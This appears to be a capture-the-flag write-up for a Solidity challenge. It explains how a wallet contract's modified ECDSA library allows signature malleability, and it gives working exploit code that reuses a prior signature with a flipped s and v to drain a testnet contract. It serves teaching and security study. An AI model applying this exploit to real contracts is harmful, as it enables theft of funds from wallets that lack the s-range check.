# Solidity challenge EtherWallet.sol

## The objective

The task is simple: Steal all ether from the contract.

## Overview

`EtherWallet.sol` is a small wallet contract, anyone can deposit ether and anyone with a valid signature can withdraw. There are only two state variables and two functions, `withdraw(bytes memory signature)` and `transferOwnership(address newOwner)`. `transferOwnership` is copied from OpenZeppelins Ownable contract.

Function `withdraw` expects a signature and checks if its signed by the owner of the contract:

```solidity
function withdraw(bytes memory signature) external {
  require(!usedSignatures[signature], "Signature already used!");
  require(
    ECDSA.recover(keccak256("\x19Ethereum Signed Message:\n32"), signature) ==
      owner,
    "No permission!"
  );
  usedSignatures[signature] = true;

  uint256 balance = address(this).balance;
  payable(msg.sender).transfer(balance);

  emit Withdraw(msg.sender, balance);
}

```

It stores all used signatures in a mapping, preventing signature replay attacks:

```solidity
mapping(bytes => bool) public usedSignatures;
```

## Vulnerability

The code of `EtherWallet.sol` itself is fine, there are no hidden vulnerabilites, so we have to dig deeper. `EtherWallet.sol` uses library `ECDSA` for its signature verificiation, specifically function `recover`:

```solidity
function recover(
  bytes32 hash,
  uint8 v,
  bytes32 r,
  bytes32 s
) internal pure returns (address) {
  // If the signature is valid, return the signer address
  address signer = ecrecover(hash, v, r, s);
  require(signer != address(0), "ECDSA: invalid signature");

  return signer;
}

```

To hack this contract, one has to understand how ECDSA signatures work: Ethereum signatures consists of three integers: `v`, `r` and `s`.

ECDSA uses elliptic curves, which are **symmetric** over the x-axis -- `r` is related to the x coordinate of the elliptic curve, while `s` is related to
the y coordinate.

==> That means if `(r, s)` is a valid signature, `(r, n - s)` is valid too:

```
|| 0 1 2 s0 4 | 5 s1 7 8 n ||  <== s0=3 and s1=6 are both valid
```

We use `v` to find out which point to use, in Ethereum its either `0x1b` (27) for `s < n/2`, or `0x1c` (28) for `s > n/2`. For the secp256k1 curve used in Ethereum (and Bitcoin) `n` is `0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141`.

Battle tested contracts, like OpenZeppelin's ECDSA library, enforce that `s` is in the lower half, preventing the Signature malleability exploit. However, the built-in Ethereum function `ecrecover(hash, v, r, s)` does not. So, if theres an existing tx on the blockchain with values `v`, `r` and `s` we can simply compute the other valid `s` and adjust `v` accordingly, e.g. if `s < n/2`, compute `s_new = n - s` and change `v` from 27 to 28.

The `ECDSA` library used in this contract is similiar to OpenZeppelins library, but the important part, where it is enforced that `s` must be in the lower half, is removed.

## Exploit

Contract `EtherWallet` was deployed to the Goerli test network, see [Etherscan](https://goerli.etherscan.io/address/0x4b90946ab87bf6e1ca1f26b2af2897445f48f877).

After deployment, `withdraw` was called with signature `0x53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c`.

To exploit the vulnerability, we first have to extract values `v`, `r` and `s` from the signature:

```solidity
(r, s, v) = _getSignature(
    hex"53e2bbed453425461021f7fa980d928ed1cb0047ad0b0b99551706e426313f293ba5b06947c91fc3738a7e63159b43148ecc8f8070b37869b95e96261fc9657d1c"
);

function _getSignature(bytes memory signature)
    internal
    pure
    returns (
        bytes32,
        bytes32,
        uint8
    )
{
    bytes32 r;
    bytes32 s;
    uint8 v;
    // ecrecover takes the signature parameters, and the only way to get them
    // currently is to use assembly.
    /// @solidity memory-safe-assembly
    assembly {
        r := mload(add(signature, 0x20))
        s := mload(add(signature, 0x40))
        v := byte(0, mload(add(signature, 0x60)))
    }
    return (r, s, v);
}
```

Then do the necessary calculations:

```solidity
if (v == 27) {
    bytes32 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
    sNew = bytes32(uint256(n) - uint256(s));

    // set v to 28 since we now use s in the upper half
    vNew = 28;
} else {
    bytes32 n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141;
    sNew = bytes32(uint256(n) - uint256(s));

    // set v to 27 since we now use s in the lower half
    vNew = 27;
}
```

Equipped with our new signature, we just have to call `withdraw` again:

```solidity
bytes memory newSignature = abi.encodePacked(r, sNew, vNew);
(bool success, bytes memory ret) = address(etherwallet).call(
    abi.encodeWithSignature("withdraw(bytes)", newSignature)
);
```

See [exploitEtherWallet.sol](../script/exploits/exploitEtherWallet.sol) for full code.

## Further information

- [VNFT.t.sol](../test/EtherWallet.t.sol) test script setting up and exploiting the contract
- [More info](http://coders-errand.com/malleability-ecdsa-signatures/) about signature malleability
